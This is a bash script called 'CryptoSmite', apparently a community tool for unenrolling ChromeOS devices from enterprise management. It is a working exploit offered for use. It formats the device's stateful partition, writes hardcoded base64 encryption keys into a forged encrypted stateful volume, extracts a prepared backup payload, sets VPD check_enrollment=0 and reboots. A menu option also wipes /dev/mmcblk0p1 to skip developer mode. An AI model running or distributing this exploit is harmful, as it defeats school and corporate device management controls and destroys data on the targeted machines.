#!/bin/bash
#
# cryptosmite.sh remake or something
# by Writable and OlyB
#
# unenroll only for now, will add more features later
#

set -eE

print_welcome() {
    echo "Welcome to the CryptoSmite toolkit"
    echo "Please look at the following options: "
    echo "(1) Unenrollment"
	echo "(2) Re-enrollment *not-implemented*"
	echo "(3) Skip Devmode"
	echo "(q) Quit"
}
reenroll() {
	echo "Not implemented"
}
skip_devmode() {
	clear
	echo "This will reboot your device, please press ctrl-c within 3 seconds if you have selected the wrong option to quit the program. THIS DOESN'T FEATURE UNENROLLMENT, SELECT OPTION 1."
	mkfs.ext4 /dev/mmcblk0p1 -F
	mount -o loop,rw /dev/mmcblk0p1 /tmp
	touch /tmp/.developer_mode
	umount /tmp && sync
	reboot
}
confirm_choice() {
	# Argument 1 is the function/string to confirm. Will synchronously block and execute the function,
	# if the user confirms. The function will decide whether it should reboot, exit, or return to the main menu. 
	# Otherwise exits back to the main menu loop.
	while true
	do
		clear
    local should_run=
		echo "Are you sure you want to $1? (y/n)"
		read -p ">" should_run
    case "$should_run" in
      y)
        $1
        return
        ;;
      n)
        echo "Exiting back to the main menu"
        return
        ;;
      *)
    esac
  done

}
if [ $(id -u) -gt 0 ]
then
    echo "Please run $0 as root"
    exit 0
fi
echo "-------------CryptoSmite------------"
selected_choice=""
while true
do
    # Decided not to refactor unenroll into a bash function, and only add new functions in function to exit pair
    clear
    print_welcome
    read -p "Select choice: " -r selected_choice
    case $(echo $selected_choice | awk '{print(tolower($0))}') in
    1)
        # Unenrollment past this point it will just run the code after this
		break
        ;;
    2)
        reenroll
		exit 0
        ;;
    3)
        skip_devmode
		exit 0
        ;;
    q)
        echo "Quitting now"
        sleep 0.8
        clear
        exit 0
        ;;
    *)
        echo "Invalid option"
        ;;
    esac
	 # TO unenroll
done
CRYPTSETUP_PATH=/usr/local/bin/cryptsetup_$(arch)
mount -o rw /dev/sda1 /mnt/stateful_partition
chmod +x /usr/local/bin/cryptsetup_aarch64
chmod +x /usr/local/bin/cryptsetup_x86_64
SCRIPT_DATE="[2024-01-28]"
BACKUP_PAYLOAD=/mnt/stateful_partition/stateful.tar.xz
NEW_ENCSTATEFUL_SIZE=$((1024 * 1024 * 1024)) # 1 GB

[ -z "$SENSITIVE_MODE" ] && SENSITIVE_MODE=0

fail() {
	printf "%b\n" "$*" >&2
	exit 1
}

echo_sensitive() {
	if [ "$SENSITIVE_MODE" -eq 1 ]; then
		echo "Doing something"
	else
		echo "$@"
	fi
}

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -l -o name "/dev/$dev_name" 2>/dev/null)" in
				*STATE*KERN-A*ROOT-A*KERN-B*ROOT-B*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

cleanup() {
	umount "$ENCSTATEFUL_MNT" || :
	${CRYPTSETUP_PATH} close encstateful || :
	umount "$STATEFUL_MNT" || :
	trap - EXIT INT
}

key_crosencstateful() {
	cat <<EOF | base64 -d
24Ep0qun5ICJWbKYmhcwtN5tkMrqPDhDN5EonLetftgqrjbiUD3AqnRoRVKw+m7l
EOF
}

key_ecryptfs() {
	cat <<EOF | base64 -d
p2/YL2slzb2JoRWCMaGRl1W0gyhUjNQirmq8qzMN4Do=
EOF
}

[ -f "$BACKUP_PAYLOAD" ] || fail "$BACKUP_PAYLOAD not found!"

CROS_DEV="$(get_largest_cros_blockdev)"
[ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"

TARGET_PART="$(format_part_number "$CROS_DEV" 1)"
[ -b "$TARGET_PART" ] || fail "$TARGET_PART is not a block device!"

trap 'echo $BASH_COMMAND failed with exit code $?.' ERR
trap 'cleanup; exit' EXIT
trap 'echo Abort.; cleanup; exit' INT

clear
echo "Welcome to Cryptosmite."
echo "Script date: ${SCRIPT_DATE}"
echo ""
echo "This will destroy all data on ${TARGET_PART} and unenroll the device."
echo "Note that this exploit is patched on some release of ChromeOS r120 and LTS r114."
echo "Continue? (y/N)"
read -r action
case "$action" in
	[yY]) : ;;
	*) fail "Abort." ;;
esac

echo_sensitive "Wiping and mounting stateful"
mkfs.ext4 -F "$TARGET_PART" >/dev/null 2>&1
STATEFUL_MNT=$(mktemp -d)
mkdir -p "$STATEFUL_MNT"
mount "$TARGET_PART" "$STATEFUL_MNT"

echo_sensitive "Setting up encstateful"
truncate -s "$NEW_ENCSTATEFUL_SIZE" "$STATEFUL_MNT"/encrypted.block
ENCSTATEFUL_KEY=$(mktemp)
key_ecryptfs > "$ENCSTATEFUL_KEY"
${CRYPTSETUP_PATH} open --type plain --cipher aes-cbc-essiv:sha256 --key-size 256 --key-file "$ENCSTATEFUL_KEY" "$STATEFUL_MNT"/encrypted.block encstateful

echo_sensitive "Wiping and mounting encstateful"
mkfs.ext4 -F /dev/mapper/encstateful >/dev/null 2>&1
ENCSTATEFUL_MNT=$(mktemp -d)
mkdir -p "$ENCSTATEFUL_MNT"
mount /dev/mapper/encstateful "$ENCSTATEFUL_MNT"

echo_sensitive "Dropping encstateful key"
key_crosencstateful > "$STATEFUL_MNT"/encrypted.needs-finalization

echo_sensitive -n "Extracting backup to encstateful"
tar -xf "$BACKUP_PAYLOAD" -C "$ENCSTATEFUL_MNT" --checkpoint=.100
echo ""

echo "Cleaning up"
cleanup

vpd -i RW_VPD -s check_enrollment=0 || : # this doesn't get set automatically
crossystem disable_dev_request=1 || :
crossystem disable_dev_request=1 # grunt weirdness
echo "SMITED SUCCESSFULLY!"
echo ""
echo "Exploit and original POC created by Writable (unretained)"
echo "This script created by OlyB"
echo ""
echo "Rebooting in 3 seconds"
sleep 3
reboot -f
sleep infinity
